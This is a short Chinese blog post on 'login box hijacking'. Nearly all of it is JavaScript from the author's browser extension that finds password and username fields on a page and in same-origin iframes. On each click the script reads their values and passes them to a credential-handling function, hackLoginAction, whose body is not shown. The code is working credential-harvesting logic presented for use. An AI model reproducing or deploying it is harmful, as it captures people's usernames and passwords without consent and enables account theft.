
# 登录框劫持

Feei <feei#feei.cn> 11/2015

## 0x01 问题背景
自己开发的浏览器插件Edge为了获得更好的数据采集能力，增加了密码输入框的检测，并同时记录账号和密码。

## 0x02 实现思路
```javascript
/**
 * Unique
 *
 * @author Feei <wufeifei@wufeifei.com>
 * @returns {Array}
 */
Array.prototype.unique = function () {  
    var res = [];
    var json = {};
    for (var i = 0; i < this.length; i++) {
        if (!json[this[i]]) {
            res.push(this[i]);
            json[this[i]] = 1;
        }
    }
    return res;
};

/**
 * Parse document login input
 *
 * @author Feei <wufeifei@wufeifei.com>
 * @param inputs
 * @description
 * Login's password can with input[type=password] find
 * Login's username can with input.attr('name') contain name/user discernment, if not find then select password input index -1's input
 */
function parseDocument(inputs) {  
    var password = [];
    var username = [];
    var usernameInputKeywords = ['user', 'name'];
    for (var i = 0; i < inputs.length; i++) {
        /**
         * Discernment password input index
         */
        if (inputs[i].type.toLowerCase() == 'password') {
            password.push(i);
        } else {
            /**
             * Discernment username input index
             */
            for (var j = 0; j < usernameInputKeywords.length; j++) {
                if (usernameInputKeywords.hasOwnProperty(j) && inputs[i].type.toLowerCase() !== 'hidden') {
                    if (inputs[i].className.toLowerCase().indexOf(usernameInputKeywords[j]) !== -1 || inputs[i].id.toLowerCase().indexOf(usernameInputKeywords[j]) !== -1) {
                        username.push(i);
                    }
                }
            }
        }
    }

    username = username.unique();

    //console.log(username);
    //console.log(password);
    //console.log(inputs);

    var passwordEle = [], usernameEle = [], inputBorder = '4px solid ', inputColor = [['black', 'red'], ['orange', 'blue'], ['green', 'pink']], tmpUsernameEle, tmpPasswordEle;
    if (password.length >= 1) {
        var hasPass = false;
        for (var k = 0; k < password.length; k++) {
            passwordEle[k] = inputs[password[k]];
            if (typeof username[k] !== 'undefined') {
                usernameEle[k] = inputs[username[k]];
            } else {
                usernameEle[k] = inputs[password[k] - 1];
            }
            usernameEle[k].style.borderRight = inputBorder + inputColor[k][0];
            passwordEle[k].style.borderRight = inputBorder + inputColor[k][1];
            if (usernameEle[k].value != '' && passwordEle[k].value != '') {
                hasPass = true;
                hackLoginAction(false, usernameEle[k].value, passwordEle[k].value);
            }

            if (usernameEle[k].value != '') {
                tmpUsernameEle = usernameEle[k];
            }

            if (passwordEle[k].value != '') {
                tmpPasswordEle = passwordEle[k];
            }
        }
        if (hasPass === false && (typeof tmpUsernameEle != 'undefined' && typeof tmpPasswordEle != 'undefined')) {
            tmpUsernameEle.style.borderRight = inputBorder + inputColor[0][0];
            tmpPasswordEle.style.borderRight = inputBorder + inputColor[1][1];
            hackLoginAction(false, tmpUsernameEle.value, tmpPasswordEle.value);
        }
    }
}

/**
 * Parse all document
 */
var inputs;  
function parseAllDocument(e) {  
    /**
     * Current document
     */
    if (typeof e == 'undefined') {
        inputs = document.getElementsByTagName('input');
        parseDocument(inputs);
    } else if (e.view == top.window) {
        inputs = document.getElementsByTagName('input');
        parseDocument(inputs);
    }
    /**
     * Many document (iFrames)
     * @type {NodeList}
     */
    var iFrames = document.getElementsByTagName("iframe");
    var doc = [];
    for (var j = 0; j < iFrames.length; j++) {
        /**
         * Only listen equally with base document and iFrame document and not cross domain
         */
        if ((window.location.href.split(':')[0] == iFrames[j].src.split(':')[0]) && (window.location.href.split('/')[2] == iFrames[j].src.split('/')[2])) {
            console.log(iFrames[j]);
            doc[j] = iFrames[j].contentDocument ? iFrames[j].contentDocument : iFrames[j].contentWindow.document;
            inputs = doc[j].getElementsByTagName('input');
            if (typeof e != 'undefined' && e.view == top.window) {
                parseDocument(inputs);
            }
            doc[j].addEventListener('click', function () {
                parseDocument(inputs);
            })
        }
    }
}

// Parse all document
parseAllDocument();

// Listen click event
document.addEventListener('click', function (e) {  
    parseAllDocument(e);
});
```
